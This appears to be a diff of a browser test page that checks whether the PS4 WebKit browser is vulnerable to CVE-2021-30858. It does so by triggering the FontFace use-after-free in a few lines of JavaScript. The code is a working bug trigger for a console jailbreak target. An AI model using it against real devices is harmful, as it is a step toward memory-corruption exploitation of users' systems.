@@ -4,14 +4,11 @@
 
         async function testwebkit() {
 
-            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check if bug is not patched!!!");
-            let font = new FontFace('font1', 'url()',{});
-            alert("Step one. OK!!");
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Message Alert' or 'Memory Error'.\n If 'Bug Patched' Msgs is shown means this bug does not work on your current FW and has been patched!!!");
+            let font = new FontFace('font1', '',{});
             var fontFaceSet = new FontFaceSet([font]);
-            alert("Step two. OK!!");
-            //UAF CODE...
             font.family = 'font2';
-            alert("CVE-2021-30858 Webkit exploit bug.. Seems Working :P!!");
+            alert("Bug Patched :(");
 
         }
 
